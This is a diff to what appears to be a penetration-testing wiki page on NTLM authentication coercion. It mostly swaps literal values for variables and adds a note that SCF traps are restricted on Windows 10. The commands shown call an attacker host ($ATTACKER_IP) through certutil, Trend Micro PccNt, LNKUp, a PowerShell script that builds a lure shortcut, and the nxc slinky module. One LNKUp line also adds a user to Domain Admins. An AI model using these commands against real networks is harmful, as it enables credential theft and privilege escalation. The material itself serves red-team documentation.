@@ -74,7 +74,7 @@ certutil.exe -syncwithWU \\$ATTACKER_IP\share
 ### Trend Micro Remote Scanning
 
 ```bash
-C:\Program Files (x86)\Trend Micro\OfficeScan Clien\PccNt.exe \\$ATTACKER_IP\s\
+C:\Program Files (x86)\Trend Micro\OfficeScan Client\PccNt.exe \\$ATTACKER_IP\s\
 ```
 
 ### Shortcut files (scf, lnk, url)
@@ -85,7 +85,7 @@ SMB shares can be trapped with shortcut files that will automatically be handled
 > Shares an account has WRITE privileges over can be mapped with [smbmap](https://github.com/ShawnDEvans/smbmap) (Python).
 > 
 > ```bash
-> smbmap -d "domain" -u "user" -p "password" --host-file targets.txt
+> smbmap -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --host-file targets.txt
 > ```
 
 > [!TIP]
@@ -113,14 +113,14 @@ An LNK shortcut using an icon file located on a remote SMB share will be parsed 
 LNKUp.py --host $ATTACKER_IP --type ntlm --output '@CONFIDENTIAL-ACCOUNTS.txt.lnk'
 
 # SMB trap + command execution
-LNKUp.py --host $ATTACKER_IP --type ntlm --output '@CONFIDENTIAL-ACCOUNTS.txt.lnk' --execute "net group 'Domain Admins' Pentester01 /domain /add"
+LNKUp.py --host $ATTACKER_IP --type ntlm --output '@CONFIDENTIAL-ACCOUNTS.txt.lnk' --execute "net group 'Domain Admins' $USER /domain /add"
 ```
 
 ```bash
 # Simple SMB trap with remote icon file (Powershell)
 $objShell = New-Object -ComObject WScript.Shell
 $lnk = $objShell.CreateShortcut("C:\Windows\temp\@Salaries-2023.lnk")
-$lnk.TargetPath = "\\\@icon.png"
+$lnk.TargetPath = "\\ATTACKER_IP\share\icon.png"
 $lnk.WindowStyle = 1
 $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
 $lnk.Description = "Salaries-2023."
@@ -138,16 +138,19 @@ $lnk.Save()
 
 ```bash
 # Creation & upload
-nxc smb "target" -d "domain" -u "user" -p "password" -M slinky -O NAME="SHARE" SERVER="ATTACKER_IP"
+nxc smb "$TARGET" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M slinky -O NAME="SHARE" SERVER="$ATTACKER_IP"
 
 # Cleanup
-nxc smb "target" -d "domain" -u "user" -p "password" -M slinky -O NAME="SHARE" SERVER="ATTACKER_IP" CLEANUP=True
+nxc smb "$TARGET" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M slinky -O NAME="SHARE" SERVER="$ATTACKER_IP" CLEANUP=True
 ```
 
 
 === .scf
 
 An SCF shortcut using an icon file located on a remote SMB share will be parsed by the file explorer that will request the icon file and authenticate if necessary.
+
+> [!NOTE]
+> Automatic coercion via `.scf` files has been largely restricted since Windows 10 version 1709 (Fall Creators Update), where Explorer patches reduced passive coercion from SCF icon loading. This technique is primarily of historical relevance for modern desktop targets; it may still be effective on older or unpatched systems.
 
 
 ```bash
